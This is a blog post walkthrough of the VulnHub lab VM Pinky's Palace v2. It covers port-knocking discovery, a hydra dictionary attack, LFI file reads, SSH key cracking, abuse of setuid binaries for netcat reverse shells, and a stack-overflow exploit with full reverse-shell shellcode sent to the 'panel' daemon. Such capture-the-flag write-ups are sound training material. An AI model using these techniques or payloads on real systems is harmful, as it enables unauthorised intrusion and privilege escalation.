@@ -1,0 +1,300 @@
+
+
+Surviving the Pink Dungeon
+
+
+
+
+
+
+
+
+Bernie Lim
+
+
+
+
+A security enthusiast. Likes cats.
+
+
+
+
+
+29 Apr 2018
+
+
+
+14 min read
+
+
+0 Comments
+
+
+
+
+
+This post documents the complete walkthrough of Pinkyâs Palace: v2, a boot2root VM created by Pink_Panther, and hosted at VulnHub. If you are uncomfortable with spoilers, please stop reading now.
+
+Background
+This is a realistic and hellish (emphasis mine) boot2root, a name given to a safe and controlled environment (typically distributed as a virtual machine) where you can perform real-world penetration testing on intentionally vulnerable applications and/or services. You boot up the virtual machine and you root it. The ultimate goal is to gain root access and read /root/root.txt.
+Hint: Map pinkydb to the assigned IP address in /etc/hosts.
+Information Gathering
+Letâs kick this off with a nmap scan to establish the services available in the host.
+# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.10.130
+...
+PORT      STATE    SERVICE REASON         VERSION
+80/tcp    open     http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
+|_http-generator: WordPress 4.9.4
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Pinky&amp;#039;s Blog &amp;#8211; Just another WordPress site
+4655/tcp  filtered unknown no-response
+7654/tcp  filtered unknown no-response
+31337/tcp filtered Elite   no-response
+
+nmap finds 80/tcp open, no SSH service, and a bunch of filtered ports. Although I donât know what to make of the filtered ports now, they may prove interesting later. Who knows, right?
+Directory/File Enumeration
+The combination of wfuzz and big.txt from SecLists is my go-to weapon and ammunition to fuzz for directories and/or files because they produce actionable results. Here, I find two WordPress installations and the presence of one interesting directory /secret in the host.
+# wfuzz -w /usr/share/seclists/Discovery/Web-Content/big.txt --hc 404 http://pinkydb/FUZZ
+********************************************************
+* Wfuzz 2.2.11 - The Web Fuzzer                        *
+********************************************************
+
+Target: http://192.168.10.130/FUZZ
+Total requests: 20469
+
+==================================================================
+ID	Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000015:  C=403     11 L	      32 W	    298 Ch	  ".htaccess"
+000016:  C=403     11 L	      32 W	    298 Ch	  ".htpasswd"
+016077:  C=301      9 L	      28 W	    317 Ch	  "secret"
+016215:  C=403     11 L	      32 W	    302 Ch	  "server-status"
+019909:  C=301      9 L	      28 W	    320 Ch	  "wordpress"
+019949:  C=301      9 L	      28 W	    319 Ch	  "wp-admin"
+019953:  C=301      9 L	      28 W	    321 Ch	  "wp-content"
+019965:  C=301      9 L	      28 W	    322 Ch	  "wp-includes"
+
+The directory /secret has a text file bambam.txt with the following content.
+# curl http://pinkydb/secret/bambam.txt
+8890
+7000
+666
+
+pinkydb
+
+I get three numbers and I already know pinkydb is the host name.
+WordPress
+The best tool, hands down and bar none, to scan for WordPress vulnerabilities and to identify users, is wpscan.
+# wpscan --url pinkydb --enumerate u
+_______________________________________________________________
+        __          _______   _____                  
+        \ \        / /  __ \ / ____|                 
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 2.9.3
+          Sponsored by Sucuri - https://sucuri.net
+   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
+_______________________________________________________________
+
+[+] URL: http://pinkydb/
+[+] Started: Fri Apr 27 02:19:10 2018
+...
+[+] Enumerating usernames ...
+[+] Identified the following 1 user/s:
+    +----+-----------+---------------------+
+    | Id | Login     | Name                |
+    +----+-----------+---------------------+
+    | 1  | pinky1337 | pinky1337 â Pinky's |
+    +----+-----------+---------------------+
+
+wpscan finds no exploitable vulnerabilities and identifies one WordPress user pinky1337. Disappointed? Donât be. We are still in the beginning stages of enumeration.
+While I was skimming through the blog, I spotted non-English words. Based on experience, thereâs a good chance one of these words is a password. I built a custom wordlist from the blog using cewl, and together with hydra, I attempted a dictionary attack on WordPress. Although none of the words yielded any results, the wordlist has not gone to waste. I could always use it when the need for another dictionary attack arises.
+# cewl -m3 pinkydb 2&gt;/dev/null | sed 1d | tee cewl.txt
+# john --rules --wordlist=cewl.txt --stdout | tee wordlist.txt
+
+Knock Knock. Whoâs There?
+Back to the numbers in bambam.txt. If I had to guess, I would say Iâm looking at port numbers (0-65535) and that suggests port-knocking.
+Although we have three port numbers, the order or sequence of knocking, to unlock the ports, is unknown at this point.
+To that end, I wrote a port-knocking script, knock.sh, to determine the correct sequence using nmap.
+knock.sh
+#!/bin/bash
+
+TARGET=$1
+
+for ports in $(cat permutation.txt); do
+    echo "[*] Trying sequence $ports..."
+    for p in $(echo $ports | tr ',' ' '); do
+        nmap -n -v0 -Pn --max-retries 0 -p $p $TARGET
+    done
+    sleep 3
+    nmap -n -v -Pn -p- -A --reason $TARGET -oN ${ports}.txt
+done
+
+permutation.txt contains all the permutations of 8890,7000,666 and I use the following Python code to generate it.
+python -c 'import itertools; print list(itertools.permutations([8890,7000,666]))' | sed 's/), /\n/g' | tr -cd '0-9,\n' | sort | uniq &gt; permutation.txt
+
+When knock.sh reaches the sequence 7000,666,8890, it unlocks three more services, including the familiar SSH service.
+# ./knock.sh 192.168.10.130
+[*] Trying sequence 7000,666,8890...
+...
+PORT      STATE SERVICE REASON         VERSION
+80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
+|_http-generator: WordPress 4.9.4
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Pinky&amp;#039;s Blog &amp;#8211; Just another WordPress site
+4655/tcp  open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
+| ssh-hostkey:
+|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 (RSA)
+|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a (ECDSA)
+|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 (ED25519)
+7654/tcp  open  http    syn-ack ttl 64 nginx 1.10.3
+| http-methods:
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: nginx/1.10.3
+|_http-title: 403 Forbidden
+31337/tcp open  Elite?  syn-ack ttl 64
+| fingerprint-strings:
+|   GetRequest:
+|     [+] Welcome to The Daemon [+]
+|     This is soon to be our backdoor
+|     into Pinky's Palace.
+|     HTTP/1.0
+|   NULL:
+|     [+] Welcome to The Daemon [+]
+|     This is soon to be our backdoor
+|_    into Pinky's Palace.
+
+Now that I know the correct sequence to unlock those ports, I can always use nmap to unlock them again.
+# for p in 7000 666 8890; do nmap -n -v0 -Pn --max-retries 0 -p $p 192.168.10.130; done
+
+The service at tcp/7654 appears to be running nginx, while the service at tcp/31337 appears to be echoing whatever thatâs thrown at it.
+Pinkyâs Database
+Pinkyâs Database Login (http://pinkydb:7654/login.php) is the attack surface weâve been looking for!
+
+Remember the custom wordlist we built earlier? Now itâs the time we put it to good use with hydra.
+# echo pinky &gt; usernames.txt
+# echo pinky1337 &gt;&gt; usernames.txt
+# hydra -L usernames.txt -P wordlist.txt -o hydra.txt -s 7654 pinkydb http-post-form /login.php:user=^USER^&amp;pass=^PASS^:Invalid
+[7654][http-post-form] host: pinkydb   login: pinky   password: Passione
+[7654][http-post-form] host: pinkydb   login: pinky1337   password: entry
+
+The credential (pinky:Passione) is the right one. Awesome.
+
+Itâs easy to spot the LFI vulnerability with pageegap.php. Also, notice something different? pageegap is a palindrome. Creative file naming, eh?
+
+With the LFI vulnerability in mind, letâs see if we can make use of it to display /etc/passwd.
+# curl http://pinkydb:7654/pageegap.php?1337=/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
+mysql:x:106:111:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
+demon:x:1001:1001::/home/demon:/bin/bash
+stefano:x:1002:1002::/home/stefano:/bin/bash
+
+stefano has an account in pinkydb and we have his SSH private key from above. I guess thatâs an open invitation to log in to his account via SSH.
+I log in to find his RSA private key protected by a password. In case you are panicking, itâs not difficult to use ssh2john and John the Ripper to recover the password.
+# ssh2john id_rsa &gt; id_rsa.hash
+# john --show id_rsa.hash
+id_rsa:secretz101
+
+With the password out of the way, itâs almost trivial to log in to stefanoâs account.
+
+Privilege Escalation
+I notice /home/stefano/tools/qsub and /usr/local/bin/backup.sh during enumeration of stefanoâs account; they may be key pieces to the privilege escalation puzzle. Hereâs why.
+Image shows pinky and www-data have the rights to read qsub.
+
+Image shows demon and pinky have the rights to edit backup.sh.
+
+Itâs almost as if one thing leads to another.
+To read /home/stefano/tools/qsub and to study it in greater detail, I need to be pinky or www-data. Since I donât know pinkyâs password, the other way is to edit any of the .php files in /var/www (the home directory of www-data) where stefano has permission to write.
+$ find /var/www -perm /o+w
+/var/www/html/apache/wp-config.php
+
+I edit wp-config.php to execute remote commands as www-data.
+Image shows that I can execute remote command on pinkydb as www-data.
+
+Image shows qsub encoded in base64.
+
+I copy qsub over to my analysis machine, and decode it back to its binary form.
+
+Now that qsub is on my machine, I can perform reverse engineering, and after stepping through the main() and send() functions, this is what I discover:
+
+The program qsub has one argumentâthe message to pinky
+
+The input password is the value of the TERM environment variable, and must be less than or equal to forty characters
+The send() function is an abstraction for /bin/echo [Message] &gt;&gt; /home/pinky/messages/stefano_msg.txt
+
+
+The image shows qsub compares the input password with the value of the TERM environment variable
+
+The image shows system() library function executes shell command /bin/echo with output redirection to a file.
+
+Since I know how qsub works, and it has been setuid to pinky, I can exploit it to create /home/pinky/.ssh/authorized_keys with the RSA key pair I control.
+Although the steps are slightly convoluted, the end result is deeply satisfactory:
+
+Generate the RSA key pair on my machine
+Exploit qsub to run a netcat reverse shell with pinkyâs privileges
+Copy and paste the RSA public key to /home/pinky/.ssh/authorized_keys
+
+Log in to pinkyâs account with the RSA private key
+
+Image shows the exploit on qsub to run netcat reverse shell.
+
+Image shows copying and pasting the RSA public key to /home/pinky/.ssh/authorized_keys.
+
+Image shows pinkyâs account after logging in with the RSA private key.
+
+The ultimate aim of gaining control of pinkyâs account is so that I can edit /usr/local/bin/backup.sh, add this line, and run a reverse shell as demon.
+
+Iâve set up a netcat listener on my machine to receive the reverse shell.
+
+Now, I can use the same Jedi trick of copying over the RSA public key I control, log in with SSH, and take full control of demonâs account.
+
+To recap, the work is far from complete; the final piece of the privilege escalation puzzle is in fact /daemon/panel.
+
+I use scp to grab a copy of /daemon/panel to my analysis machine (it runs 64-bit Kali Linux and replicates the conditions of pinkydb as close as possible) so that I can analyze it with gdb and PEDA. To be more precise, I run ./panel and attach gdb to it so that I can debug itâa dynamic analysis technique as opposed to reverse engineering.
+
+As seen above, ASLR is not disabled and the stack is executable.
+Using readelf, Iâm able to spot the main() function, along with the handlecmd() function, which I suppose handles the input provided to the program listening at tcp/31337.
+
+After disassembling the handlecmd() function with gdb, I place a breakpoint at &lt;handlecmd+70&gt; where I can analyze the stack overflow and the offset with which to control the RIP before the program takes back control.
+
+I create a 200-byte pattern with pattern_create, save it to a file, and then send it over to ./panel listening at tcp/31337.
+
+gdb pauses the program at &lt;handlecmd+70&gt;.
+
+The command pattern_offset finds the pattern at an offset of 120 bytes.
+
+The basic exploit structure looks like this.
+perl -e 'print "A" x 120 . "BBBBBB"' where BBBBBB is the return address we have yet to determine.
+
+Here we are, back at the breakpoint. Before BBBBBB returns, we see 120 'A's followed by BBBBBB at the top of the stack. If we can find a return address with jmp rsp or call rsp, we are able to execute a 120-byte payload placed in the stack.
+
+Using the command jmpcall, we can pinpoint the exact address within ./panel that has a call rsp. This is our return address.
+We proceed to generate a payload with msfvenom. I prefer to use a single-stage reverse shell as the payload to a multi-stage one. Although single-stage payload has a bigger size, it gets everything done in shorter time.
+
+The generated payload is 119 bytes, and fits in nicely onto the given 120 bytes of space with one byte to spare. 
+Getting to the root of the matter
+The stage is now set for the real privilege escalation. I run the following command on my machine.
+# perl -e 'print "\x90" . "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xd7\x5f\x69\x30\xa9\x2d\x85\x1e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xbd\x76\x31\xa9\xc3\x2f\xda\x74\xd6\x01\x66\x35\xe1\xba\xcd\xa7\xd5\x5f\x78\x6c\x69\x85\x8f\x9e\x86\x17\xe0\xd6\xc3\x3d\xdf\x74\xfd\x07\x66\x35\xc3\x2e\xdb\x56\x28\x91\x03\x11\xf1\x22\x80\x6b\x21\x35\x52\x68\x30\x65\x3e\x31\xb5\x36\x07\x1f\xda\x45\x85\x4d\x9f\xd6\x8e\x62\xfe\x65\x0c\xf8\xd8\x5a\x69\x30\xa9\x2d\x85\x1e" . "\xfb\x0c\x40\x00\x00\x00"' | nc pinkydb 31337
+
+A root shell appears on my netcat listener.
+
+After spawning a better looking shell with a bunch of keystrokes, the flag is basically there for the taking.
+
+
+Afterthought
+âPinkyâs Palaceâ is a misnomerâit should be âPinkyâs Dungeonâ. 
+Walking through this âdungeonâ took longer than usual because I had to document down the crucial sections and had to take more screen captures. It certainly lived up to its name of being harder than the first oneâthe twist and turns, the reverse engineering of qsub, and the exploit development for panel, all tough but fun challenges.
+I give it a .
+
